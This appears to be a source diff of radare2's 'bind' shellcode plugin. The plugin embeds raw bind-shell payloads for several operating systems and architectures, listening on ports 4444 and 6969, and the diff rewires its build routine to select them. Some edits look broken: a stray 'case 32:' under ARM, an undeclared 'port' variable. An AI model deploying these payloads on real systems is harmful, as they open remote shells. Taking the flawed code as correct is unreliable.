@@ -1,7 +1,8 @@
-/* radare - LGPL - Copyright 2013 - pancake */
+/* radare - LGPL - Copyright 2013-2025 - pancake */
 
 #include <r_egg.h>
 
+#define SUPPORT_UDP 0
 
 static ut8 x86_osx_bind4444[] =
 	"\x33\xc9\x83\xe9\xea\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc5"
@@ -22,7 +23,7 @@ static ut8 x86_solaris_bind4444[] =
 	"\x6f\x60\x24\xa2\x4c\x60\x63\xa2\x5d\x61\x65\x04\xdc\x58\x58\x04"
 	"\xdd\x58\x59\xde\x8f\x33\xf4\x58";
 
-// port must be configurable
+// TODO: port must be configurable
 static long x86_openbsd_bind6969[]= { // 391b
 	0x4151c931,0x51514151,0x61b0c031,0x078980cd,0x4f88c931,0x0547c604,0x084f8902,
 	0x0647c766,0x106a391b,0x5004478d,0x5050078b,0x68b0c031,0x016a80cd,0x5050078b,
@@ -39,7 +40,7 @@ static ut8 x86_linux_bind4444[] =
 	"\x31\xfa\x58\x69\x12\xf6\x97\xb0\x31\xa3\x58\x69\xc8\xe5\x6c\x59\x8a\xce"
 	"\xfd\xc6\xae\xef\xfd\x81\xae\xfe\xfc\x87\x08\x7f\xc7\xba\x08\x7d\x58\x69\x00";
 
-// TODO: UDP support
+#if SUPPORT_UDP
 static ut8 x86_linux_udp4444[] =
 	"\x33\xc9\x83\xe9\xe7\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x13\xec\x81"
 	"\xca\x83\xeb\xfc\xe2\xf4\x22\x37\xd2\xa0\x11\x86\x83\x89\x79\x8a\xd9\x43"
@@ -48,6 +49,8 @@ static ut8 x86_linux_udp4444[] =
 	"\xde\x6c\xeb\xc1\x4b\xbe\xe7\xa2\x3e\x85\x08\x2b\x79\x8b\xe7\xa2\x7a\x82"
 	"\xe9\xaf\x77\x85\xf5\xa2\x3e\xc1\xef\xa5\x9a\x0b\xd3\xa2\x3c\xc3\xf2\xa2"
 	"\x7b\xc3\xe3\xa3\x7d\x65\x62\x98\x42\xbb\xd2\x43\xf2\x21\x01\xca\x00";
+#endif
+
 
 static ut8 arm_linux_bind[] =
 	"\x20\x60\x8f\xe2"   /*  add   r6, pc, #32           */
@@ -142,6 +145,7 @@ static ut8 x86_w32_tcp4444[] =
 
 
 static RBuffer *build(REgg *egg) {
+	char *shell= NULL;
 	RBuffer *buf = r_buf_new ();
 	const ut8 *sc = NULL;
 	int cd = 0;
@@ -152,33 +156,42 @@ static RBuffer *build(REgg *egg) {
 	case R_EGG_OS_DARWIN:
 		switch (egg->arch) {
 		case R_SYS_ARCH_X86:
-			if (suid) {
-				sc = x86_osx_suid_binsh;
-				cd = 7+36;
-			} else {
-				sc = x86_osx_binsh;
-				cd = 36;
-			}
-		case R_SYS_ARCH_ARM:
-			// TODO
+			sc = x86_osx_bind4444;
+			break;
+		}
+		break;
+	case R_EGG_OS_SOLARIS:
+		switch (egg->arch) {
+		case R_SYS_ARCH_X86:
+			sc = x86_solaris_bind4444;
+			break;
+		}
+		break;
+	case R_EGG_OS_OPENBSD:
+		switch (egg->arch) {
+		case R_SYS_ARCH_X86:
+			sc = (const ut8*)x86_openbsd_bind6969;
 			break;
 		}
 		break;
 	case R_EGG_OS_LINUX:
-		if (suid) R_LOG_WARN ("no suid for this platform");
-		suid = 0;
 		switch (egg->arch) {
 		case R_SYS_ARCH_X86:
 			switch (egg->bits) {
-			case 32: sc = x86_linux_binsh; break;
-			case 64: sc = x86_64_linux_binsh; break;
-			default: R_LOG_ERROR ("Unsupported");
+			case 32: sc = x86_linux_bind4444; break;
+			// TODO: support udpcase 32: sc = x86_linux_udp4444; break;
 			}
 			break;
+		case R_SYS_ARCH_SPARC:
+			sc = sparc_linux_bind4444;
+			break;
 		case R_SYS_ARCH_ARM:
-			sc = arm_linux_binsh;
+			case 32: sc = arm_linux_bind; break;
 			break;
 		}
+		break;
+	case R_EGG_OS_WINDOWS:
+		sc = x86_w32_tcp4444;
 		break;
 	default:
 		R_LOG_ERROR ("unsupported os %x", egg->os);
@@ -186,24 +199,30 @@ static RBuffer *build(REgg *egg) {
 	}
 	if (sc) {
 		r_buf_set_bytes (buf, sc, strlen ((const char *)sc));
-		if (shell && *shell) {
+		if (R_STR_ISNOTEMPTY (port)) {
 			if (cd) {
-				r_buf_write_at (buf, cd, (const ut8*)shell, strlen (shell)+1);
+				ut8 nport = atoi (port);
+				r_buf_write_at (buf, cd, (const ut8*)&nport, 1);
 			} else {
-				R_LOG_ERROR ("Cannot set shell");
+				R_LOG_ERROR ("Cannot set port");
 			}
 		}
+	} else {
+		R_LOG_ERROR ("Unsupported target");
 	}
-	free (suid);
 	free (shell);
 	return buf;
 }
 
 //TODO: rename plugin to run
 REggPlugin r_egg_plugin_bind = {
-	.name = "bind",
+	.meta = {
+		.name = "bind",
+		.author = "pancake",
+		.license = "MIT",
+		.desc = "listen port=4444",
+	},
 	.type = R_EGG_PLUGIN_SHELLCODE,
-	.desc = "listen port=4444",
 	.build = (void *)build
 };
 
